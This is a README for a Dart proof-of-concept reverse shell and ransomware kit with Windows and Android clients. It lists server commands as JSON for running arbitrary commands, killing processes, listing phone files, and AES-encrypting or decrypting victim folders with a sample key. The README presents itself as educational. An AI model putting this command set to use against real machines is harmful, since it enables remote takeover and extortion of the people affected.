# Reverse shell & Ransomware server and clients using Dart
This project demonstrates a proof-of-concept implementation of a Reverse Shell and Ransomware Server and Clients using Dart. The purpose of this project is educational, showcasing how reverse shells and ransomware work in a controlled environment. It is not intended for malicious use.

# Features
- Reverse Shell: Allows the server to execute commands on the client machine.
- Ransomware: Encrypts/Decrypts files on the client machine once connected to the server using Advanced Encryption Standard (AES).
- Cross-Platform: Windows version and android version.
 
# Disclaimer
This project is for educational purposes only. The author does not condone the use of this software for malicious purposes. Use this software responsibly and only in environments where you have explicit permission to do so.

#### This project was inspired by "Joao-b4".

# Usage 

        Run the server: In the terminal/cmd, go to server/bin folder, and run the command "dart run main.dart"
        
        Options:
        /list - List all of the Clients connected
        /set id - Enter the command interface for the selected client
        /exit - Exit to command interface

        Commands Avaible:
        * Get Information from System:  {"id": "1"} 
        * Run Command on System:  {"id": "2", "parameter": "ipconfig"}
        * Run Command on System through powershell *(Windows only): {"id": "3", "parameter": "ls"}
        * Kill Process in the System: {"id": "4", "parameter": "4517"} 
        * List phone files: {"id":"5"}
        * Encrypt files from selected path to .mart: 
          ** Desktop: {"id": "6", "path":"C:\Users\docteur\Desktop\tet", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO"} 
          ** Phone: {"id": "6", "path": "storage/emulated/0/Documents/", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO"}     

        * Decrypt files(.MART) from selected path: 
          we are using AES, hence the need of the key in the decryption.
          ** Desktop: {"id": "7", "path":"C:\Users\docteur\Desktop\tet", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO" } 
          ** Phone: {"id": "7", "path": "storage/emulated/0/Documents/", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO"}     
          
